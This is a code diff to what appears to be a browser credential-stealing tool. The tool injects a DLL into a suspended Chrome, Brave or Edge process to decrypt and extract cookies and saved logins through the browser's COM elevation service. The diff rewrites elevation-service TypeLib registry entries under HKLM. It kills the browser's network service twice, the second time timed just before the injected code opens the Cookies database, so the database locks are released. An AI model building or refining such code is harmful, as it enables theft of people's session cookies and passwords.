@@ -90,6 +90,96 @@ std::optional<Configuration> Configuration::CreateFromArgs(int argc, wchar_t* ar
     return config;
 }
 
+// Fix stale TypeLib registry paths after Chrome/Brave auto-update.
+// Chrome updates its executable but sometimes leaves TypeLib registry entries pointing
+// to the old (deleted) elevation_service.exe, causing CoCreateInstance TYPE_E_CANTLOADLIBRARY.
+void FixChromeTypeLibPaths(const std::wstring& browserExePath, const Console& console)
+{
+    // Chrome installs to Application\chrome.exe but stores versioned binaries under
+    // Application\<version>\elevation_service.exe. We must scan for the version directory.
+    fs::path appDir = fs::path(browserExePath).parent_path();
+
+    fs::path elevSvc;
+
+    // Case 1: already in versioned dir (e.g. Application\146.0.7680.165\chrome.exe)
+    fs::path candidate = appDir / L"elevation_service.exe";
+    if (fs::exists(candidate))
+        elevSvc = candidate;
+
+    // Case 2: appDir is Application\, version dirs are subdirectories
+    if (elevSvc.empty())
+    {
+        std::vector<int> bestVersion;
+        std::error_code ec;
+        for (const auto& entry : fs::directory_iterator(appDir, ec))
+        {
+            if (!entry.is_directory(ec))
+                continue;
+
+            std::wstring dirName = entry.path().filename().wstring();
+            std::vector<int> parts;
+            std::wistringstream ss(dirName);
+            std::wstring token;
+            bool valid = true;
+            while (std::getline(ss, token, L'.'))
+            {
+                try { parts.push_back(std::stoi(token)); }
+                catch (...) { valid = false; break; }
+            }
+            if (!valid || parts.size() != 4)
+                continue;
+
+            fs::path svcCandidate = entry.path() / L"elevation_service.exe";
+            if (!fs::exists(svcCandidate, ec))
+                continue;
+
+            if (bestVersion.empty() || parts > bestVersion)
+            {
+                bestVersion = parts;
+                elevSvc = svcCandidate;
+            }
+        }
+    }
+
+    if (elevSvc.empty())
+        return;
+
+    std::wstring newPath = elevSvc.wstring();
+
+    const wchar_t* const typeLibGuids[] = {
+        L"{463ABECF-410D-407F-8AF5-0DF35A005CC8}",  // IElevatorChrome
+        L"{B88C45B9-8825-4629-B83E-77CC67D9CEED}",  // IElevatorChromium
+        L"{A2721D66-376E-4D2F-9F0F-9070E9A42B5F}",  // IElevatorChromeBeta
+        L"{BB2AA26B-343A-4072-8B6F-80557B8CE571}",  // IElevatorChromeDev
+        L"{4F7CE041-28E9-484F-9DD0-61A8CACEFEE4}",  // IElevatorChromeCanary
+    };
+
+    for (const auto* guid : typeLibGuids)
+    {
+        for (const auto* arch : { L"win32", L"win64" })
+        {
+            std::wstring regPath = std::wstring(L"SOFTWARE\\Classes\\TypeLib\\") + guid + L"\\1.0\\0\\" + arch;
+            HKEY hKey = nullptr;
+            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, regPath.c_str(), 0, KEY_READ | KEY_WRITE, &hKey) != ERROR_SUCCESS)
+                continue;
+
+            wchar_t curVal[MAX_PATH] = {};
+            DWORD sz = sizeof(curVal);
+            DWORD type = 0;
+            if (RegQueryValueExW(hKey, nullptr, nullptr, &type, reinterpret_cast<LPBYTE>(curVal), &sz) == ERROR_SUCCESS
+                && type == REG_SZ && !fs::exists(curVal))
+            {
+                RegSetValueExW(hKey, nullptr, 0, REG_SZ,
+                    reinterpret_cast<const BYTE*>(newPath.c_str()),
+                    static_cast<DWORD>((newPath.size() + 1) * sizeof(wchar_t)));
+                console.Debug("Fixed stale TypeLib path for " + Utils::WStringToUtf8(guid) +
+                    " [" + Utils::WStringToUtf8(arch) + "]");
+            }
+            RegCloseKey(hKey);
+        }
+    }
+}
+
 // Orchestrates complete injection workflow: cleanup, injection, execution, termination
 PipeCommunicator::ExtractionStats RunInjectionWorkflow(const Configuration& config, const Console& console)
 {
@@ -124,10 +214,15 @@ PipeCommunicator::ExtractionStats RunInjectionWorkflow(const Configuration& conf
         }
     }
 
-    // Terminate processes holding database locks
+    // For Chrome/Brave: fix stale TypeLib paths that break CoCreateInstance after auto-update
+    if (config.browserType != L"edge")
+        FixChromeTypeLibPaths(config.browserDefaultExePath, console);
+
+    // Kill network service for all browsers — releases Cookies/LoginData DB locks
+    // Keep main browser process alive for all browsers — COM elevation service must stay reachable
     KillBrowserNetworkService(config, console);
-    KillBrowserProcesses(config, console);
-    
+
+
     // Create suspended target process
     TargetProcess target(config, console);
     target.createSuspended();
@@ -143,6 +238,13 @@ PipeCommunicator::ExtractionStats RunInjectionWorkflow(const Configuration& conf
     // Wait for module connection and send configuration
     pipe.waitForClient();
     pipe.sendInitialData(config.verbose, config.outputPath, edgeDpapiKey);
+
+    // Kill network service again right before DLL starts extraction.
+    // The DLL spends ~500ms on COM key decryption after receiving config,
+    // so this second kill hits just before the Cookies database is opened.
+    // Chrome rarely needs this because it restarts its network service slower than Edge.
+    KillBrowserNetworkService(config, console);
+
     pipe.relayMessages();
 
     // Cleanup
